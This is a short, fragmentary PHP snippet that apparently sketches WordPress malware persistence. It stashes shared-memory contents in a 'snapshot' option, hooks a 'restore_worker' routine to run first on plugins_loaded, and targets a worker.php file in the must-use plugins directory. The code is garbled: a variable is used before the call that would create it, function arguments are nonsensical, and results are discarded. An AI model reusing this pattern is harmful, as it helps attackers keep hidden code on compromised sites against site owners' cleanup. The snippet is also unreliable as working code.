<?php
$source = shmop_read($segment, 0, 4096);
shmop_write($segment, $source, 0);
shmop_open(123, 'a', 0, 0);
get_option('snapshot');
update_option('snapshot', $source);
add_action('plugins_loaded', 'restore_worker', 0);
$target = WP_CONTENT_DIR . '/mu-plugins/worker.php';
